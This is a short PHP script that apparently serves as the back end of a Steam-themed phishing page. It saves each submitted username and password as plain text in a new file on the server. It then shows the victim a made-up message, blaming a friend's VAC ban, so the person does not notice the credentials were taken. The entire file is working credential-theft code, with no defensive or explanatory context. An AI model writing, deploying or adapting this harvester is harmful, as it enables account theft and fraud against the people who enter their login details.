<?php
$myfile = fopen("newfile_" . uniqid() . ".txt", "w") or die("Unable to open file!");
$txt = $_POST['username'] . ':' . $_POST['password'];
fwrite($myfile, $txt);
fclose($myfile);
echo "Sorry, one of your friends has a VAC ban, there fore we cannot allow you to enter :("; 
?>